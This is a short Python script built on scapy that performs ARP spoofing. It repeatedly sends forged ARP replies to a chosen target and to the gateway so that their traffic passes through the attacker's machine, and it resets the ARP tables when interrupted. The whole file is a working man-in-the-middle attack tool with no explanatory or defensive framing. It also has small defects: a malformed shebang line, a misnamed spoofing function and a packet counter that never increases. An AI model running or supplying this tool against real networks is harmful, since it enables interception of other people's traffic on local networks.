#!/bin/sh/python3
import time

import scapy.all as scapy
import time
import argparse

def arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target", dest= "target_ip", help="set target ip")
    parser.add_argument("-g", "--gateway", dest= "gateway_ip", help="set gateway ip")
    args = parser.parse_args()
    return args


def mac_get(ip):

    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst='ff:ff:ff:ff:ff:ff')
    broadcast_request = broadcast/arp_request
    answered = scapy.srp(broadcast_request, timeout=1, verbose=False)[0]
    return answered[0][1].hwsrc


def arp_scan(target_ip, spoof_ip):
    target_mac=mac_get(target_ip)
    packet = scapy.ARP(op=2,pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet)

def arp_restore(dest_ip,source_ip):
    dest_mac= mac_get(dest_ip)
    source_mac=mac_get(source_ip)
    packet = scapy.ARP(op=2, pdst=dest_ip, hwdst=dest_mac, psrc=source_ip ,hwsrc =source_mac)
    scapy.send(packet ,count =4,verbose =False)

arguments_value = arguments()
target_ip = arguments_value.target_ip
gateway_ip = arguments_value.gateway_ip

count_packets = 0
try:
    while True:
        arp_scan(target_ip,gateway_ip)
        arp_scan(gateway_ip,target_ip)
        print("\rpackets sent" + str(count_packets), end="")
        time.sleep(2)
except KeyboardInterrupt:
    print("resetting arp tables")
    arp_restore(target_ip, gateway_ip)
    arp_restore(gateway_ip, target_ip)

